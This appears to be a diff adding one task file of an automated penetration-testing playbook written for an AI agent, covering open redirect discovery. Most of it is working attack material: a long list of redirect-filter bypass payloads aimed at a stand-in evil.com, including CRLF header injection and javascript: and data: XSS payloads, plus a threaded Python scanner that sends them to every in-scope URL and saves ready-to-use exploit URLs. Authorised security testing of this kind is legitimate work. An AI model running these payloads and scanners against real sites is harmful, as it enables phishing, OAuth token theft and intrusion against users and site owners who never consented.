@@ -1,0 +1,529 @@
+================================================================================
+TASK 97 - OPEN REDIRECT
+================================================================================
+Covers testing_toolkit.txt Phase 15 Step 52
+URL redirect validation bypass
+
+OPEN REDIRECT = PHISHING ENABLER
+Legitimate domain redirects to attacker site.
+Victim sees trusted URL, ends up on evil site.
+
+victim.com/redirect?url=https://evil.com
+→ Trust the domain, get phished!
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts
+outputs/url_corpus_all_in_scope.txt        <- URL corpus
+outputs/har/common_data.txt                <- Extracted params from HAR
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/openredirect/
+    redirect_params.txt                    <- Parameters that accept URLs
+    vulnerable_endpoints.txt               <- Confirmed open redirects
+    bypass_techniques.txt                  <- Bypass methods that worked
+    poc_urls.txt                           <- Ready-to-use exploit URLs
+
+outputs/vulnerabilities/OPEN-REDIRECT-*-LOW.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+UNDERSTAND OPEN REDIRECT:
+
+    Common vulnerable patterns:
+    |
+    +-- Redirect parameters:
+    |   +-- url, redirect, next, return, goto
+    |   +-- redir, destination, continue, forward
+    |   +-- returnUrl, returnTo, redirect_uri
+    |
+    +-- Common locations:
+    |   +-- Login flows: /login?next=/dashboard
+    |   +-- Logout flows: /logout?redirect=
+    |   +-- OAuth callbacks: /callback?redirect_uri=
+    |   +-- Share links: /share?url=
+    |   +-- Short URLs: /go?url=
+
+    Impact chain:
+    |
+    Open Redirect alone = LOW severity
+    BUT:
+    |
+    +-- Phishing attacks (credential theft)
+    +-- OAuth token theft (redirect_uri)
+    +-- SSRF chain (internal redirect)
+    +-- XSS chain (javascript: URLs)
+    +-- Bypass referer checks
+
+================================================================================
+PHASE 1: IDENTIFY REDIRECT PARAMETERS
+================================================================================
+
+-----------------------------------------
+1.1 Extract URL Parameters
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+openredirect_scanner.py - Find and test open redirect vulnerabilities
+"""
+
+import requests
+import re
+import os
+from urllib.parse import urlparse, parse_qs, urlencode
+
+os.makedirs('outputs/openredirect', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+# Common redirect parameter names
+REDIRECT_PARAMS = [
+    'url', 'redirect', 'next', 'return', 'goto',
+    'redir', 'destination', 'continue', 'forward',
+    'returnUrl', 'returnTo', 'redirect_uri', 'return_url',
+    'redirectUrl', 'redirect_url', 'callback', 'out',
+    'view', 'link', 'to', 'target', 'u', 'r',
+    'ref', 'referrer', 'site', 'page', 'path',
+    'RelayState', 'ReturnUrl', 'Redirect',
+]
+
+class OpenRedirectScanner:
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.redirect_endpoints = []
+        self.vulnerable = []
+    
+    def find_redirect_params(self, urls):
+        """Find URLs with potential redirect parameters"""
+        
+        for url in urls:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            
+            for param in REDIRECT_PARAMS:
+                if param.lower() in [p.lower() for p in params.keys()]:
+                    self.redirect_endpoints.append({
+                        'url': url,
+                        'param': param
+                    })
+        
+        return self.redirect_endpoints
+
+-----------------------------------------
+1.2 Search for Redirect in Response
+-----------------------------------------
+def find_redirect_in_forms(html_content, base_url):
+    """Find redirect parameters in HTML forms"""
+    
+    redirect_inputs = []
+    
+    # Find hidden inputs with URL values
+    pattern = r'<input[^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']+)["\']'
+    matches = re.findall(pattern, html_content, re.IGNORECASE)
+    
+    for name, value in matches:
+        if name.lower() in [p.lower() for p in REDIRECT_PARAMS]:
+            redirect_inputs.append({
+                'param': name,
+                'value': value
+            })
+        elif value.startswith('http') or value.startswith('/'):
+            redirect_inputs.append({
+                'param': name,
+                'value': value,
+                'note': 'URL-like value'
+            })
+    
+    return redirect_inputs
+
+================================================================================
+PHASE 2: BYPASS TECHNIQUES
+================================================================================
+
+-----------------------------------------
+2.1 Open Redirect Bypass Payloads
+-----------------------------------------
+def generate_bypass_payloads(target_domain, evil_domain="evil.com"):
+    """Generate bypass payloads for redirect filters"""
+    
+    payloads = [
+        # Basic external redirect
+        f"https://{evil_domain}",
+        f"http://{evil_domain}",
+        f"//{evil_domain}",
+        
+        # Double URL encoding
+        f"https%3A%2F%2F{evil_domain}",
+        f"https%253A%252F%252F{evil_domain}",
+        
+        # Protocol confusion
+        f"https://{evil_domain}%2F%2E%2E",
+        f"/%09/{evil_domain}",
+        f"/%5c{evil_domain}",
+        f"/.{evil_domain}",
+        
+        # @ bypass
+        f"https://{target_domain}@{evil_domain}",
+        f"https://{evil_domain}%40{target_domain}",
+        f"https://foo@{evil_domain}:{target_domain}",
+        
+        # Backslash tricks
+        f"https://{evil_domain}\\{target_domain}",
+        f"/\\{evil_domain}",
+        f"\\\\{evil_domain}",
+        
+        # Fragment bypass
+        f"https://{evil_domain}#{target_domain}",
+        f"//{evil_domain}%23{target_domain}",
+        
+        # Subdomain tricks
+        f"https://{target_domain}.{evil_domain}",
+        f"https://{evil_domain}?{target_domain}",
+        f"https://{evil_domain}/{target_domain}",
+        
+        # NULL byte
+        f"https://{evil_domain}%00{target_domain}",
+        f"https://{evil_domain}%00.{target_domain}",
+        
+        # Unicode tricks
+        f"https://{evil_domain}%E3%80%82{target_domain}",  # Ideographic full stop
+        
+        # CRLF injection
+        f"https://{target_domain}%0d%0aLocation:%20https://{evil_domain}",
+        
+        # JavaScript (for XSS chains)
+        "javascript:alert(document.domain)",
+        "javascript://comment%0aalert(1)",
+        "java%0d%0ascript:alert(1)",
+        
+        # Data URI
+        "data:text/html,<script>alert(1)</script>",
+        
+        # Tab/newline bypass
+        f"https://{evil_domain}%09",
+        f"https://{evil_domain}%0d%0a",
+        f"ht\ttps://{evil_domain}",
+        
+        # Case variations
+        f"HTTPS://{evil_domain}",
+        f"hTtPs://{evil_domain}",
+        
+        # IPv6
+        "https://[::1]/",
+        
+        # Dotless IP
+        "https://0x7f000001/",  # 127.0.0.1
+        
+        # Open redirect chains
+        f"/redirect?url=/redirect?url=https://{evil_domain}",
+    ]
+    
+    return payloads
+
+================================================================================
+PHASE 3: TEST REDIRECTS
+================================================================================
+
+-----------------------------------------
+3.1 Test Single Redirect
+-----------------------------------------
+def test_redirect(url, param, payload):
+    """Test single redirect parameter with payload"""
+    
+    session = requests.Session()
+    
+    # Build test URL
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    params[param] = [payload]
+    
+    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
+    
+    try:
+        resp = session.get(
+            test_url,
+            allow_redirects=False,
+            timeout=15,
+            verify=False
+        )
+        
+        # Check for redirect
+        if resp.status_code in [301, 302, 303, 307, 308]:
+            location = resp.headers.get('Location', '')
+            
+            # Check if redirects to our payload
+            if payload in location or urlparse(payload).netloc in location:
+                return {
+                    'url': test_url,
+                    'param': param,
+                    'payload': payload,
+                    'location': location,
+                    'status': resp.status_code,
+                    'vulnerable': True
+                }
+        
+        # Check for JavaScript redirect
+        if 'location' in resp.text.lower() and payload in resp.text:
+            return {
+                'url': test_url,
+                'param': param,
+                'payload': payload,
+                'type': 'javascript_redirect',
+                'vulnerable': True
+            }
+        
+        # Check for meta refresh
+        meta_match = re.search(
+            r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+content=["\'][^"\']*url=([^"\']+)',
+            resp.text, re.IGNORECASE
+        )
+        if meta_match and payload in meta_match.group(1):
+            return {
+                'url': test_url,
+                'param': param,
+                'payload': payload,
+                'type': 'meta_refresh',
+                'vulnerable': True
+            }
+            
+    except:
+        pass
+    
+    return {'vulnerable': False}
+
+================================================================================
+PHASE 4: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+openredirect_complete.py - Complete open redirect scanner
+"""
+
+import os
+import json
+import requests
+from urllib.parse import urlparse, parse_qs, urlencode
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+os.makedirs('outputs/openredirect', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class OpenRedirectAudit:
+    
+    def __init__(self, evil_domain="evil.com"):
+        self.evil_domain = evil_domain
+        self.session = requests.Session()
+        self.redirect_endpoints = []
+        self.vulnerable = []
+    
+    def find_redirect_params(self, urls):
+        """Find URLs with redirect parameters"""
+        
+        redirect_params = [
+            'url', 'redirect', 'next', 'return', 'goto',
+            'redir', 'destination', 'continue', 'forward',
+            'returnUrl', 'returnTo', 'redirect_uri', 'return_url',
+            'redirectUrl', 'redirect_url', 'callback', 'out',
+            'ref', 'to', 'target', 'u', 'r', 'link',
+        ]
+        
+        for url in urls:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            
+            for param_name in params.keys():
+                if param_name.lower() in [p.lower() for p in redirect_params]:
+                    self.redirect_endpoints.append({
+                        'url': url,
+                        'param': param_name,
+                        'original_value': params[param_name][0]
+                    })
+        
+        return self.redirect_endpoints
+    
+    def generate_payloads(self, target_domain):
+        """Generate bypass payloads"""
+        
+        return [
+            f"https://{self.evil_domain}",
+            f"//{self.evil_domain}",
+            f"https://{target_domain}@{self.evil_domain}",
+            f"https://{self.evil_domain}#{target_domain}",
+            f"https://{target_domain}.{self.evil_domain}",
+            f"/\\{self.evil_domain}",
+            f"https://{self.evil_domain}%00{target_domain}",
+            f"/{self.evil_domain}",
+            "javascript:alert(document.domain)",
+        ]
+    
+    def test_endpoint(self, endpoint):
+        """Test single endpoint for open redirect"""
+        
+        url = endpoint['url']
+        param = endpoint['param']
+        target_domain = urlparse(url).netloc
+        
+        payloads = self.generate_payloads(target_domain)
+        findings = []
+        
+        for payload in payloads:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            params[param] = [payload]
+            
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            if params:
+                test_url += f"?{urlencode(params, doseq=True)}"
+            
+            try:
+                resp = self.session.get(
+                    test_url,
+                    allow_redirects=False,
+                    timeout=15,
+                    verify=False
+                )
+                
+                if resp.status_code in [301, 302, 303, 307, 308]:
+                    location = resp.headers.get('Location', '')
+                    
+                    # Check if redirects to evil domain
+                    if self.evil_domain in location:
+                        findings.append({
+                            'url': test_url,
+                            'param': param,
+                            'payload': payload,
+                            'location': location
+                        })
+                        break  # One finding is enough
+                        
+            except:
+                continue
+        
+        return findings
+    
+    def scan_all(self, urls, threads=10):
+        """Scan all URLs"""
+        
+        # Find redirect parameters
+        self.find_redirect_params(urls)
+        
+        print(f"[*] Found {len(self.redirect_endpoints)} potential redirect params")
+        
+        # Test each endpoint
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {executor.submit(self.test_endpoint, ep): ep 
+                      for ep in self.redirect_endpoints}
+            
+            for future in as_completed(futures):
+                findings = future.result()
+                self.vulnerable.extend(findings)
+    
+    def generate_reports(self):
+        """Generate vulnerability reports"""
+        
+        for i, vuln in enumerate(self.vulnerable):
+            report = f"""# Open Redirect Vulnerability
+
+**URL**: {vuln['url']}
+**Parameter**: {vuln['param']}
+**Severity**: LOW (can be chained)
+
+## PoC URL
+```
+{vuln['url']}
+```
+
+## Redirect Location
+```
+{vuln['location']}
+```
+
+## Bypass Used
+```
+{vuln['payload']}
+```
+
+## Impact
+- Phishing attacks (redirect users to fake login)
+- OAuth token theft (redirect_uri manipulation)
+- Chain with SSRF for internal access
+- Chain with XSS if javascript: works
+
+## Recommendations
+1. Use allowlist for redirect destinations
+2. Validate redirect URL against trusted domains
+3. Use indirect references (IDs) instead of URLs
+4. Warn users before external redirects
+"""
+            
+            with open(f'outputs/vulnerabilities/OPEN-REDIRECT-{i}-LOW.md', 'w') as f:
+                f.write(report)
+    
+    def save_results(self):
+        """Save all results"""
+        
+        # Redirect parameters found
+        with open('outputs/openredirect/redirect_params.txt', 'w') as f:
+            for ep in self.redirect_endpoints:
+                f.write(f"{ep['param']}|{ep['url']}\n")
+        
+        # Vulnerable endpoints
+        with open('outputs/openredirect/vulnerable_endpoints.txt', 'w') as f:
+            for v in self.vulnerable:
+                f.write(f"{v['url']}\n")
+        
+        # PoC URLs
+        with open('outputs/openredirect/poc_urls.txt', 'w') as f:
+            for v in self.vulnerable:
+                f.write(f"{v['url']}\n")
+        
+        # Full findings
+        with open('outputs/openredirect/findings.json', 'w') as f:
+            json.dump(self.vulnerable, f, indent=2)
+        
+        # Bypass techniques that worked
+        with open('outputs/openredirect/bypass_techniques.txt', 'w') as f:
+            payloads_used = set(v['payload'] for v in self.vulnerable)
+            for p in payloads_used:
+                f.write(f"{p}\n")
+
+# Run
+if __name__ == "__main__":
+    with open('outputs/url_corpus_all_in_scope.txt') as f:
+        urls = [l.strip() for l in f if l.strip()]
+    
+    print(f"[*] Scanning {len(urls)} URLs for open redirect...")
+    
+    audit = OpenRedirectAudit(evil_domain="evil-attacker.com")
+    audit.scan_all(urls)
+    audit.save_results()
+    audit.generate_reports()
+    
+    print(f"\n[*] Open redirects found: {len(audit.vulnerable)}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] Redirect parameters identified in URLs
+[ ] Basic external redirects tested
+[ ] Bypass techniques tested (encoding, @, etc.)
+[ ] JavaScript redirects tested
+[ ] Meta refresh redirects tested
+[ ] PoC URLs generated
+[ ] All findings documented
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 98: HTTP Verb Tampering (Phase 15 - Misc Advanced)
